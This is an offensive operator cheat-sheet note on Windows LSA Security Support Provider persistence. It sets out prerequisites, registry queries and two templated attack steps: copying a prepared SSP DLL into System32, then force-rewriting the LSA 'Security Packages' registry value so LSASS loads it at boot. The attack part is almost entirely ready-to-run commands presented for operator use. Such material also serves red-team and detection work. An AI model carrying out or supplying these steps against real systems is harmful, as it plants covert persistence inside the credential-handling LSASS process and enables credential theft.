---
technique: LSA Security Support Provider Persistence
category: persistence
targets: Windows LSA
protocols: Local
remote_capable: false
tags: windows persistence lsa ssp authentication-package dll
---

# LSA Security Support Provider Persistence

LSA SSP persistence registers a prepared authentication package or security support provider DLL for loading by LSASS.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Administrative access | Registry and LSASS load path changes require admin or SYSTEM |
| Prepared DLL | Payload construction belongs in a tool or payload note |
| Reboot or LSASS restart | Most LSA package changes load on reboot or LSASS start |

## Windows

### Query security packages

#cmd #registry #lsa

Query configured LSA security packages.

```cmd title:"Query LSA security packages"
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages"
```
<!-- cheat -->

### Query authentication packages

#cmd #registry #lsa

Query configured LSA authentication packages.

```cmd title:"Query LSA authentication packages"
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages"
```
<!-- cheat -->

### Step 1: Copy SSP DLL

#cmd #lsa #persistence

Copy a prepared SSP DLL into System32.

```cmd title:"Copy SSP DLL to System32"
copy "$dll_path" "C:\Windows\System32\$dll_name"
```
<!-- cheat
var dll_path
var dll_name
-->

### Step 2: Register security package

#cmd #registry #lsa

Set the LSA security package list to include the prepared DLL name.

```cmd title:"Register LSA security package"
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "$package_list" /f
```
<!-- cheat
var package_list
-->

## Linux

No Linux operator command is included here. This note covers Windows LSA SSP persistence.
